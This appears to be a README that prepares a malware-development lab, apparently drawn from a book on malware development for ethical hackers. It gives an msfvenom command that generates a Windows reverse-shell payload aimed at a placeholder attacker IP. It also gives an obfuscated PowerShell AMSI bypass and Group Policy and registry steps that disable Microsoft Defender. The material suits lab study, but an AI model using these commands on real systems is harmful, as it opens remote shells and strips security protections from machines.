# Tools
- [Process Hacker](https://processhacker.sourceforge.io/)
- Kali VM 
- Windows 11 VM
- Parrot 


# Before getting started
You might need to generate the payload in `Kali`.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP_ADDR> LPORT=4444 -f c
```
![payload](./Screenshots/01.png)

Turn off the defender
```powershell

Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
```

// Turn off Virus detection
```powershell
# WIN + R
gpedit.msc
```
- In the `Group Policy Editor`, go to `Computer Configuration` > `Administrative Templates` > `Windows Components` > `Microsoft Defender Antivirus`.

- Navigate to `Computer Configuration` > `Administrative Templates` > `Windows Components` > `Microsoft Defender Antivirus` > `Tamper Protection`.
- Enable the policy named Turn off `Tamper Protection`.

- Find the policy named Turn off `Microsoft Defender Antivirus`.
- Double-click it, set it to `Enabled`, and then click `Apply` and `OK`.

- Go to `Real-time Protectio`n under the `Microsoft Defender Antivirus settings`.
- Find Turn off `real-time protection` and set it to `Enabled`

// 02
```powershell
# WIN + R 
regedit
```
- Go to `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`
The setup as follows:
- DisableAntiSpyware = 1
- DisableRoutinelyTakingAction = 1
- ServiceStartStates = 4

# References
- Most of codes are from [Malware-Development-for-Ethical-Hackers
](https://github.com/PacktPublishing/Malware-Development-for-Ethical-Hackers) by Zhassulan Zhussupov, 2024.
- [DLL Hijacking Basics](https://medium.com/@zapbroob9/dll-hijacking-basics-ea60b0f2a1d8) by Enes Adışen, 2023.

